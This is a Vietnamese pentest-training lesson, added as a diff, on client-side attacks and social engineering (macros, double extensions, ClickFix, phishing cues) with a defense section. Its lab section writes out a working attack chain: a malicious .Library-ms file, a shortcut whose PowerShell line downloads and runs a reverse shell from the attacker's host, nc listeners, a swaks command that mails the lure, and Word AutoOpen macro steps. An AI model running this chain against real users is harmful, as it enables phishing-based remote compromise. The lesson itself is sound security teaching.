@@ -1,0 +1,224 @@
+---
+title: "Lỗ hổng phía client và kỹ thuật xã hội"
+code: "2.4"
+level: 2
+summary: "Khi máy chủ được bảo vệ kỹ, kẻ tấn công quay sang tấn công người dùng và phần mềm trên máy họ. Bài này giải thích vì sao đây là con đường vào phổ biến nhất, nó vận hành thế nào, và cách phòng cả về kỹ thuật lẫn về con người."
+duration: "55 phút"
+updated: "2026-11-12"
+prereq: ["2.3"]
+objectives:
+  - "Giải thích được lỗ hổng phía client khác lỗ hổng phía server ở đâu, và vì sao tấn công client luôn cần nạn nhân thao tác"
+  - "Mô tả được cách một tài liệu có macro, một file đuôi kép hay một trang ClickFix đưa mã độc vào máy người dùng"
+  - "Nhận ra một email lừa đảo qua các dấu hiệu thật, kể cả khi nó không có lỗi chính tả nào"
+  - "Đề xuất được biện pháp phòng thủ dựa trên con người và biện pháp kỹ thuật cho cùng một nguy cơ"
+---
+import ConceptMap from '../../components/sim/ConceptMap.tsx';
+import Callout from '../../components/ui/Callout.astro';
+import Terminal from '../../components/ui/Terminal.astro';
+import Lenh from '../../components/ui/Lenh.astro';
+import PhishingSpotter from '../../components/sim/PhishingSpotter.tsx';
+import LabBrief from '../../components/ui/LabBrief.astro';
+import Quiz from '../../components/sim/Quiz.tsx';
+
+## Hình dung trước
+
+Một kẻ trộm có thể mất nhiều ngày phá khoá. Hoặc chỉ cần mặc đồng phục thợ sửa ống nước, mang theo cái túi dụng cụ và gõ cửa: chủ nhà tự tay mở cửa mời vào. Kỹ thuật xã hội là cách thứ hai. Thay vì đánh vào máy móc đã được bảo vệ kỹ, kẻ tấn công đánh vào niềm tin của con người.
+
+Điều này giải thích vì sao ở ngoài đời, khi hệ thống máy chủ ngày càng khó vào, phần lớn vụ xâm nhập thật bắt đầu bằng một email hay một tài liệu gửi cho nhân viên.
+
+Trong phòng thi OSCP bạn không lừa người thật, nhưng kiến thức này vẫn cần: nó cho bạn thấy các bài về Active Directory ở Cấp 3 thường bắt đầu từ chỗ kẻ tấn công đã có sẵn một tài khoản nhân viên, và ngoài đời tài khoản đó hay tới từ chính con đường trong bài này. Phần đầu bài nói về cách kẻ tấn công làm; phần cuối nói về cách một công ty chặn.
+
+## Kiến thức chính
+
+### Phía client là gì
+
+Ở bài 2.3, lỗ hổng nằm ở máy chủ (server). Còn lỗ hổng phía client nằm ở phần mềm chạy trên máy người dùng: trình duyệt, phần mềm đọc PDF, bộ công cụ văn phòng. Kẻ tấn công không đụng tới máy chủ được canh gác kỹ mà dụ nạn nhân mở một file hoặc trang web độc hại, rồi khai thác phần mềm trên máy họ.
+
+Hệ quả là bước đầu luôn cần nạn nhân thao tác (nhớ chỉ số "cần nạn nhân thao tác" trong CVSS, bài 2.5), và đó cũng là điểm yếu của cách tấn công này: nếu nạn nhân không bấm thì không có gì xảy ra.
+
+### Cơ chế tài liệu độc hại
+
+Con đường phổ biến nhất là một file văn phòng (Word, Excel) chứa **macro**: đoạn mã nhỏ nhúng trong tài liệu, vốn để tự động hoá việc soạn thảo nhưng cũng chạy được lệnh bất kỳ. Khi nạn nhân mở file và bấm "Enable Content", macro chạy và tải về phần mềm điều khiển từ xa.
+
+Đây là lý do mọi bộ Office hiện đại chặn macro mặc định và hiện cảnh báo lớn màu vàng: tin nhắn đó không phải là thủ tục, mà là lớp bảo vệ cuối cùng chỉ còn trông vào quyết định của một người.
+
+Các biến thể khác cũng cùng ý tưởng, chỉ khác cách khiến nạn nhân bấm:
+
+- **Đuôi kép:** file đính kèm tên `HoaDon.pdf.exe`. Windows hay ẩn phần đuôi thật, nên nạn nhân chỉ thấy `HoaDon.pdf`, trong khi đó thực chất là một chương trình.
+- **Liên kết tới trang khai thác trình duyệt chưa vá:** nạn nhân chỉ cần mở trang, không cần tải gì.
+- **ClickFix:** một trang giả (thường giả trang xác minh "bạn có phải người máy không") bảo người dùng tự bấm `Win+R`, dán một dòng lệnh đã được copy sẵn rồi bấm Enter để "sửa lỗi". Không có tệp độc hại nào được tải, chính người dùng tự chạy lệnh của kẻ tấn công trên máy mình. Vì không có file để bộ lọc email chặn, nó vượt qua nhiều lớp bảo vệ truyền thống, và là một kiểu tấn công đang tăng nhanh.
+
+<Callout type="note" label="Vài loại tệp mồi hay gặp trên Windows (và trong lab)">
+Ngoài macro, kẻ tấn công thích các loại tệp *trông vô hại nhưng chạy được lệnh*, và đây cũng là những thứ hay xuất hiện ở các máy Windows trong lab/đề thi: tệp lối tắt <strong>.lnk</strong> (giấu nguyên một lệnh PowerShell trong trường "Target"), tệp thư viện <strong>.Library-ms</strong> (trỏ nạn nhân tới một share của kẻ tấn công rồi mở tiếp một .lnk), và tệp <strong>.hta</strong> chạy bằng `mshta`. Nhận ra tên các loại này để không bỏ qua chúng khi gặp — cơ chế vẫn là một: dụ người dùng mở, rồi một lệnh chạy ra.
+</Callout>
+
+### Thực hành trong lab: Library-ms, lối tắt và thư mồi
+
+Đây là chuỗi client-side hay gặp nhất ở các cụm Active Directory luyện thi: đề cho bạn một máy chủ thư (cổng 25) và một tài khoản gửi thư, còn "người dùng" là một script tự mở mọi tệp đính kèm. Chuỗi có ba mảnh, mỗi mảnh làm đúng một việc:
+
+1. **Máy chủ WebDAV trên Kali** chứa tệp lối tắt. WebDAV là chia sẻ file qua HTTP, nên đi qua được cổng 80 khi SMB ra ngoài bị chặn.
+2. **Tệp `.Library-ms`** gửi cho nạn nhân. Windows coi nó là một "thư viện" và mở trong Explorer như một thư mục bình thường, nhưng nội dung thư mục lại lấy từ máy chủ WebDAV của bạn. Bộ lọc thư thường cho qua vì nó chỉ là một file XML nhỏ.
+3. **Tệp `.lnk`** nằm trong thư mục đó. Nạn nhân bấm đúp, lệnh PowerShell giấu trong lối tắt chạy và gọi reverse shell về Kali.
+
+<ConceptMap
+  client:visible
+  title="Chuỗi Library-ms: ai gọi tới ai, theo thứ tự"
+  width={700}
+  height={300}
+  nodes={[
+    { id: 'mail', label: '1. Thư có tệp đính kèm', sub: 'swaks gửi config.Library-ms', x: 115, y: 70, w: 200, detail: 'Tệp chỉ là vài dòng XML nên bộ lọc thư thường cho qua. Nội dung thư phải cho người nhận một lý do để mở.' },
+    { id: 'victim', label: '2. Nạn nhân mở tệp', sub: 'Explorer hiện một thư mục', x: 115, y: 220, w: 200, tone: 'warn', detail: 'Windows coi tệp là một thư viện và hiện nội dung của nó như thư mục bình thường. Người dùng không thấy địa chỉ thật.' },
+    { id: 'dav', label: '3. WebDAV trên Kali', sub: 'cổng 80, chứa install.lnk', x: 445, y: 220, w: 200, detail: 'Thư mục hiện ra thật ra nằm trên máy bạn. Log ghi PROPFIND là dấu hiệu nạn nhân đã mở thư viện.' },
+    { id: 'lnk', label: '4. Bấm đúp lối tắt', sub: 'PowerShell tải rev.ps1', x: 445, y: 70, w: 200, tone: 'warn', detail: 'Lệnh giấu trong lối tắt chạy trên máy nạn nhân, tải script từ máy chủ HTTP của bạn và chạy trong bộ nhớ.' },
+    { id: 'shell', label: '5. Reverse shell', sub: 'nc -lvnp 443', x: 620, y: 145, w: 140, tone: 'accent', detail: 'Máy nạn nhân gọi ngược về Kali. Bạn có shell dưới tên người dùng vừa bấm.' },
+  ]}
+  edges={[
+    { from: 'mail', to: 'victim' },
+    { from: 'victim', to: 'dav', label: 'mở qua HTTP' },
+    { from: 'dav', to: 'lnk' },
+    { from: 'lnk', to: 'shell' },
+  ]}
+/>
+
+<Lenh noi="Terminal trên máy Kali; tệp .lnk tạo trên một máy Windows của chính bạn rồi chép sang" muc="Dựng máy chủ WebDAV, soạn tệp Library-ms trỏ về nó, rồi gửi tệp đó qua máy chủ thư của lab bằng swaks" quyen="Chỉ làm trong lab hoặc khi hợp đồng ghi rõ cho phép mô phỏng phishing">
+
+<Terminal title="Ba mảnh của chuỗi Library-ms">
+
+```text
+kali@lab:~$ mkdir -p ~/webdav && wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav
+Serving on http://0.0.0.0:80
+
+kali@lab:~$ cat config.Library-ms
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  <name>@windows.storage.dll,-34582</name>
+  <isLibraryPinned>true</isLibraryPinned>
+  <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <isDefaultSaveLocation>true</isDefaultSaveLocation>
+      <simpleLocation><url>http://10.10.14.7</url></simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>
+
+    (trên máy Windows của bạn: chuột phải > New > Shortcut, ô "location" điền)
+powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8000/rev.ps1')"
+    (đặt tên "install", chép file install.lnk vào ~/webdav trên Kali)
+
+kali@lab:~$ python3 -m http.server 8000        # phục vụ rev.ps1
+kali@lab:~$ nc -lvnp 443                       # chờ shell
+
+kali@lab:~$ swaks -t dave@megacorp.lab --from it@megacorp.lab \
+            --server 10.10.14.25 --auth-user it@megacorp.lab --auth-password 'Lab123!' \
+            --header "Subject: Cau hinh may moi" --body body.txt --attach @config.Library-ms
+<-  250 Queued
+```
+
+</Terminal>
+
+<div slot="giai">
+
+- `wsgidav --auth=anonymous --root ~/webdav`: chạy máy chủ WebDAV không cần đăng nhập, phục vụ thư mục `~/webdav`.
+- Trong tệp `.Library-ms`, dòng duy nhất bạn cần sửa là `<url>`: địa chỉ máy Kali. Các dòng còn lại là khuôn cố định.
+- Dòng PowerShell trong lối tắt: `DownloadString` tải nội dung `rev.ps1` (một reverse shell PowerShell, bài 2.7) về bộ nhớ, `IEX` chạy nó luôn, không ghi file ra đĩa.
+- `swaks`: công cụ gửi thư từ dòng lệnh. `-t` người nhận, `--from` người gửi, `--server` máy chủ SMTP của lab, `--auth-user`/`--auth-password` tài khoản thư đề cho (hoặc bạn nhặt được), `--attach @tên-file` đính kèm.
+
+</div>
+
+<div slot="doc">
+
+- `250 Queued` nghĩa là máy chủ thư đã nhận. Sau đó nhìn ba cửa sổ theo thứ tự: WebDAV ghi `PROPFIND` (nạn nhân mở thư viện), máy chủ HTTP ghi `GET /rev.ps1` (nạn nhân bấm lối tắt), rồi `nc` nhận kết nối.
+- Không thấy `PROPFIND`: thư chưa tới hoặc chưa ai mở. Kiểm tra lại địa chỉ người nhận (liệt kê bằng `VRFY`, bài 2.2) và nội dung thư có lý do để mở tệp không.
+- Thấy `PROPFIND` mà không có `GET`: lối tắt sai lệnh, hoặc máy nạn nhân không ra được cổng 8000. Thử cổng 80/443.
+- Biến thể chỉ lấy hash: thay vì lối tắt, cho thư viện trỏ tới một share SMB trên Kali đang chạy Responder; máy nạn nhân tự gửi Net-NTLMv2 khi mở (bài 2.6).
+
+</div>
+
+</Lenh>
+
+<Callout type="note" label="Macro Word: dựng một bản thử trong lab">
+Khi lab cho biết nạn nhân dùng Office và mở tệp <code>.doc</code>: tạo tài liệu, lưu dạng <strong>Word 97-2003 (.doc)</strong> (dạng <code>.docx</code> không chứa được macro), vào View &gt; Macros tạo macro tên <code>AutoOpen</code> gọi <code>CreateObject("Wscript.Shell").Run cmd</code>, với <code>cmd</code> là dòng <code>powershell -enc ...</code>. VBA giới hạn một chuỗi 255 ký tự, nên phải cắt lệnh thành nhiều đoạn rồi nối lại (viết vài dòng Python để cắt, bài 1.6). Từ 2022, Office chặn hẳn macro trong tệp tải từ Internet, nên ngoài đời đường này yếu dần; đó cũng là lý do kẻ tấn công chuyển sang <code>.lnk</code>, <code>.Library-ms</code> và ClickFix.
+</Callout>
+
+### Công cụ
+
+Pentester mô phỏng các đợt này bằng công cụ chuyên dụng (ví dụ **SET, Social-Engineer Toolkit**, để dựng trang đăng nhập giả và chiến dịch email), luôn **trong phạm vi được khách hàng cho phép bằng văn bản**. Mục tiêu là đo xem bao nhiêu nhân viên bị lừa và kiểm tra các lớp phòng thủ có bắt được không, chứ không phải gây hại hay làm nhân viên xấu hổ.
+
+### Đòn bẩy tâm lý
+
+Hầu hết lừa đảo dựa vào bốn cảm xúc, và biết tên chúng giúp bạn nhận ra khi chính mình bị nhắm tới: **gấp gáp** ("trong 2 giờ", để người nhận không kịp nghĩ), **quyền uy** (giả sếp, bộ phận IT, ngân hàng), **sợ hãi** (mất tiền, mất tài khoản) và **tò mò hoặc tham** ("bạn trúng thưởng").
+
+Một email có hai trong bốn thứ này cùng lúc thì nên dừng lại và xác minh bằng một kênh khác, trước khi bấm bất kỳ chỗ nào.
+
+### Tự tập nhận diện
+
+Dưới đây là một email giả gửi tới nhân viên của công ty tưởng tượng "Minh An". Hãy đóng vai người nhận và bấm vào mọi chỗ đáng ngờ trước khi xem đáp án:
+
+<PhishingSpotter client:visible />
+
+Càng tìm được nhiều dấu hiệu, bạn càng khó bị lừa ngoài đời. Nhưng đừng chỉ dựa vào lỗi chính tả: email của kẻ tấn công giỏi (hay do AI viết hộ, xem bài 6.1) không có lỗi nào. Thói quen đáng giữ là kiểm tra tên miền thật của người gửi và đường dẫn thật của liên kết, chứ không phải cảm giác "email này nghe có vẻ đúng".
+
+<LabBrief
+  ten="Đọc header thật của một email để xác minh người gửi"
+  muctieu="Lấy header gốc (raw) của một email bất kỳ trong hộp thư của chính bạn, rồi xác minh SPF/DKIM/DMARC có khớp với người gửi hay không"
+  may="Hộp thư cá nhân của bạn (không cần máy lab riêng)"
+  thoigian="20 phút"
+  xong="Bạn chỉ ra được đúng ba dòng trong header: kết quả SPF, kết quả DKIM, và địa chỉ 'From' thật khác với tên hiển thị thế nào"
+>
+
+1. Mở một email bất kỳ, dùng chức năng "Xem nguồn gốc" hoặc "Hiện header gốc" của hộp thư.
+2. Tìm dòng `Authentication-Results`, đọc kết quả `spf=`, `dkim=`, `dmarc=`.
+3. So sánh địa chỉ sau `From:` với tên hiển thị mà giao diện hộp thư cho bạn thấy.
+4. Làm lại với một email từ một tổ chức lớn (ngân hàng, mạng xã hội) để so sánh.
+
+<div slot="goiy1">
+Trong Gmail: mở email, bấm dấu ba chấm, chọn "Hiện bản gốc". Trong Outlook web: bấm ba chấm, chọn "Xem nguồn thông báo" hoặc tương đương.
+</div>
+
+<div slot="goiy2">
+Bài 7.5 giải thích SPF, DKIM, DMARC là gì và cách đọc kết quả `pass`/`fail`/`none`, nếu bạn chưa gặp các từ này.
+</div>
+
+<div slot="kiemtra">
+
+- Đúng: email từ tổ chức lớn thường có cả ba kết quả `pass`. Một email đáng ngờ có thể có `spf=fail` hoặc `dmarc=fail` dù tên hiển thị trông quen thuộc.
+- Không thấy dòng `Authentication-Results`: hộp thư của bạn hoặc máy chủ gửi không hỗ trợ, thử với một địa chỉ Gmail hoặc Outlook.
+- Địa chỉ sau `From:` khác hẳn tên miền của tổ chức (ví dụ `@mail-noreply123.com` thay vì `@ngan-hang.com`): đó chính là dấu hiệu giả mạo hay gặp nhất, dù SPF/DKIM có thể vẫn `pass` nếu kẻ gửi dùng đúng hạ tầng của họ.
+
+</div>
+
+</LabBrief>
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Nếu bạn là người chịu trách nhiệm bảo mật của một công ty, bạn không thể chọn giữa "đào tạo nhân viên" hay "mua công cụ", vì cả hai đều thiếu một nửa. <strong>Về con người:</strong> đào tạo để nhân viên nhận ra các dấu hiệu, và quan trọng hơn, lập quy trình "nghi ngờ thì xác minh qua kênh khác" (gọi điện cho IT thay vì bấm link) và làm cho việc báo cáo nhầm cũng được khen, không bị trách. Diễn tập phishing nội bộ để đo, không để phạt.
+
+<strong>Về kỹ thuật:</strong> bật xác thực nhiều lớp (MFA, tức mật khẩu cộng thêm một yếu tố nữa) để mật khẩu lộ cũng chưa đủ đăng nhập. Ưu tiên loại chống lừa đảo (khoá FIDO2, passkey), vì mã OTP gõ tay vẫn bị dụ nhập vào trang giả (bài 6.1). Chặn macro từ Internet, lọc email và đánh dấu thư từ ngoài, tắt hộp Run với người không cần, giới hạn PowerShell để ClickFix không chạy được lệnh dán vào, và cập nhật phần mềm client để vá lỗ hổng bị khai thác qua file độc hại. Chi tiết cách cứng hoá từng thiết lập có ở bài 7.2.
+</Callout>
+
+## Lỗi người mới hay gặp
+
+- **Coi thường kỹ thuật xã hội vì nó "không kỹ thuật".** Người mới thích khai thác phức tạp và thấy phishing là chuyện của nhân viên văn phòng. Thực tế đây là con đường vào phổ biến nhất, và cũng là lý do các báo cáo pentest tốt luôn có một mục về con người.
+- **Chỉ dựa vào lỗi chính tả để nhận diện email giả.** Cách này từng đúng, nhưng không còn đúng nữa. Hãy kiểm tra tên miền thật của người gửi và đường dẫn thật của liên kết.
+- **Nghĩ MFA loại nào cũng mạnh như nhau.** Xác thực nhiều lớp là lớp bảo vệ rất mạnh khi mật khẩu bị lộ, nhưng mã OTP gõ tay vẫn bị lừa nhập vào trang giả, còn khoá FIDO2 và passkey thì không. Chọn nhầm loại là cái giá hay gặp của việc tưởng mình đã an toàn.
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: 'Vì sao khai thác phía client thường cần nạn nhân thao tác?', options: ['Phần mềm client tự tấn công', 'Cần nạn nhân mở file hoặc trang độc hại bằng phần mềm của họ', 'Client không có lỗ hổng'], answer: 1, explain: 'Khai thác xảy ra khi nạn nhân mở nội dung độc hại, nên bước đầu luôn cần một người bấm vào.' },
+    { q: 'Vì sao Office hiện đại chặn macro mặc định?', options: ['Để chạy nhanh hơn', 'Vì macro là con đường phổ biến để chạy mã độc khi mở tài liệu', 'Vì macro đã lỗi thời'], answer: 1, explain: 'Macro có thể chạy mã khi nạn nhân bật nội dung, nên bị chặn mặc định và hiện cảnh báo.' },
+    { q: 'Biện pháp kỹ thuật nào giảm hại khi mật khẩu bị lộ qua phishing?', options: ['Đổi màu giao diện', 'Bật xác thực hai lớp (2FA)', 'Xoá email'], answer: 1, explain: '2FA yêu cầu yếu tố thứ hai, nên chỉ mật khẩu là chưa đủ. Loại chống lừa đảo như khoá FIDO2 còn tốt hơn mã OTP.' },
+    { q: 'ClickFix lừa người dùng bằng cách nào?', options: ['Gửi file Word chứa macro', 'Bảo người dùng tự dán và chạy một dòng lệnh để "sửa lỗi"', 'Khai thác lỗi trình duyệt chưa vá'], answer: 1, explain: 'Người dùng tự tay chạy lệnh của kẻ tấn công nên không có file nào để bộ lọc email chặn.' },
+  ]}
+/>
+
+## Ghi nhớ
+
+- Khi máy chủ khó vào, kẻ tấn công đi vòng qua người dùng. Mọi cách tấn công phía client đều cần ai đó bấm, và đó vừa là điểm mạnh vừa là điểm yếu của nó.
+- Macro, đuôi kép và ClickFix là ba cách kinh điển để khiến người dùng tự chạy mã. Công cụ như SET chỉ dùng khi có giấy phép.
+- Nhận diện bằng tên miền và đường dẫn thật, không phải bằng lỗi chính tả. Gấp gáp cộng quyền uy là lúc cần dừng lại xác minh.
+- Phòng thủ phải có cả hai chân: quy trình xác minh và văn hoá báo cáo cho con người, MFA chống lừa đảo và chặn kỹ thuật cho máy.
